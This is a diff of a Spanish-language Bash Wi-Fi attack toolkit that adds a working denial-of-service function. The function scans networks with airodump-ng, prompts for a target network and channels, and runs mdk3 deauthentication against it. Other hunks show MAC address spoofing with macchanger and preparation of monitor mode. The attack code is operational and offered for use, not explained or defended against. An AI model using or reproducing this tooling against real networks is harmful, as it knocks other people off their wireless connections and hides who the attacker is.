@@ -442,9 +442,13 @@ eviltrust() {
 		clear; echo -e "$purpleColour[*]$grayColour Iniciando EvilTrust..."; sleep 2; startAttack
 }
 dosattack() {
-	clear; echo -e "${purpleColour}[*]$grayColour Iniciando DoS attack..."; sleep 2
-
-
+	clear; echo -e "\n${blueColourColour}[*]$grayColour Iniciando DoS attack..."; sleep 2
+	xterm -hold -e "airodump-ng $tar" &
+	dosairdump_PID=$!
+	echo -ne "${purpleColour}[?]$grayColour Cual red deseas atacar?: " && read redos
+	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
+	echo -ne "${redColour}[?]$grayColour Canales para el ataque Dos (1,6,11): " && read canalesdos
+	xterm -hold -e "sudo mdk3 $tar d -a $redos -c $canalesdos"
 }
 
 beaconflood() {
@@ -489,7 +493,7 @@ else
 			airmon-ng start $tar > /dev/null 2>&1
 			clear; echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
 			tput cnorm; echo -ne "${redColour}\n[?]$grayColour Confirmacion de la targeta (Poner el nombre tal como sale): " && read tar
-			tput civis; echo -e "\n${redColour}[*]${grayColour} Cambiando tu dirrecion MAC en $tar\n"
+			tput civis; echo -e "\n${greenColour}[*]${grayColour} Cambiando tu dirrecion MAC en $tar\n"
 			ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
 			ifconfig $tar up
 			airmon-ng check kill > /dev/null 2>&1
